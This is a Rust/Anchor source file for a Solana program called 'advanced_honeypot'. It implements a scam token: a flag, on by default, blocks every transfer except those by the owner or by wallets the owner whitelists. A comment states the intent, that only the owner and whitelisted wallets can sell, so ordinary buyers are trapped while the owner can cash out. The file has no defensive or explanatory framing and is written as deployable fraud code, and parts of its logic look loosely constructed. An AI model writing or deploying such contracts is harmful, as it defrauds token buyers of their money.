use anchor_lang::prelude::*;
use anchor_spl::token::{self, Mint, TokenAccount, Transfer};

declare_id!("YourProgramID");

#[program]
pub mod advanced_honeypot {
    use super::*;

    pub fn initialize(ctx: Context<Initialize>, _bump: u8) -> Result<()> {
        let token_data = &mut ctx.accounts.token_data;
        token_data.owner = *ctx.accounts.owner.key;
        token_data.sell_block_enabled = true; // Default to blocking sells
        token_data.whitelisted_wallets = Vec::new();
        Ok(())
    }

    pub fn transfer(ctx: Context<TransferToken>, amount: u64) -> Result<()> {
        let token_data = &ctx.accounts.token_data;
        let user = ctx.accounts.user.key();
        
        // HONEYPOT: Only allow the owner and whitelisted wallets to sell
        if token_data.sell_block_enabled && user != token_data.owner && !token_data.whitelisted_wallets.contains(&user) {
            return Err(HoneypotError::OnlyOwnerOrWhitelistedCanSell.into());
        }

        let cpi_accounts = token::Transfer {
            from: ctx.accounts.from.to_account_info(),
            to: ctx.accounts.to.to_account_info(),
            authority: ctx.accounts.user.to_account_info(),
        };
        let cpi_ctx = CpiContext::new(ctx.accounts.token_program.to_account_info(), cpi_accounts);
        token::transfer(cpi_ctx, amount)?;

        Ok(())
    }

    pub fn toggle_sell_block(ctx: Context<AdminControl>) -> Result<()> {
        let token_data = &mut ctx.accounts.token_data;
        require!(ctx.accounts.admin.key() == token_data.owner, HoneypotError::Unauthorized);
        token_data.sell_block_enabled = !token_data.sell_block_enabled;
        Ok(())
    }

    pub fn add_to_whitelist(ctx: Context<AdminControl>, wallet: Pubkey) -> Result<()> {
        let token_data = &mut ctx.accounts.token_data;
        require!(ctx.accounts.admin.key() == token_data.owner, HoneypotError::Unauthorized);
        if !token_data.whitelisted_wallets.contains(&wallet) {
            token_data.whitelisted_wallets.push(wallet);
        }
        Ok(())
    }

    pub fn remove_from_whitelist(ctx: Context<AdminControl>, wallet: Pubkey) -> Result<()> {
        let token_data = &mut ctx.accounts.token_data;
        require!(ctx.accounts.admin.key() == token_data.owner, HoneypotError::Unauthorized);
        token_data.whitelisted_wallets.retain(|&x| x != wallet);
        Ok(())
    }
}

#[account]
pub struct TokenData {
    pub owner: Pubkey,
    pub sell_block_enabled: bool,
    pub whitelisted_wallets: Vec<Pubkey>,
}

#[error_code]
pub enum HoneypotError {
    #[msg("Only the contract owner or whitelisted wallets can sell tokens.")]
    OnlyOwnerOrWhitelistedCanSell,
    #[msg("Unauthorized action.")]
    Unauthorized,
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(init, payer = owner, space = 8 + 40 + 32 * 10)]
    pub token_data: Account<'info, TokenData>,
    #[account(mut)]
    pub owner: Signer<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct TransferToken<'info> {
    #[account(mut)]
    pub from: Account<'info, TokenAccount>,
    #[account(mut)]
    pub to: Account<'info, TokenAccount>,
    pub user: Signer<'info>,
    #[account(mut)]
    pub token_data: Account<'info, TokenData>,
    pub token_program: Program<'info, token::Token>,
}

#[derive(Accounts)]
pub struct AdminControl<'info> {
    #[account(mut)]
    pub token_data: Account<'info, TokenData>,
    #[account(mut)]
    pub admin: Signer<'info>,
}
